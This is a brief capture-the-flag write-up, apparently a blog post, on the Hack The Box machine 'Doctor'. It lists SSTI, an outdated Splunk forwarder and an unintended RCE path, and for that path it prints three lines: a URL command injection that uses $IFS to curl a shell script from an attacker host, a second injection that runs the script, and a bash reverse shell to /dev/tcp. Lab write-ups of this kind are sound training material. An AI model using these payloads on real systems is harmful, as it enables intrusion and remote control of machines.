---
layout: post
category: writeup
---


- doctor is an easy box from HTB
- vulnerable SSTI to RCE
- outdated splunkforwarder
- unintended RCE in content field




[![Doctor](https://img.youtube.com/vi/uxbwCMNQ2WA/0.jpg)](https://www.youtube.com/watch?v=uxbwCMNQ2WA "Doctor Walkthrough")


- as far as the uninteded path since i don't complete it I will explain it here:

first you will need to curl in a bash  payload and save to `/var/www/html`. next you will need to run it, so the payloads should look something like this:


```
# first payload
http://IP/$('curl'$IFS'http://IP/shell.sh'$IFS'-o'$IFS'/var/www/html/shell.sh')

# second payload

http://ip/$('bash'$IFS'/var/www/html/shell.sh')

# contents of shell.sh:

bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```
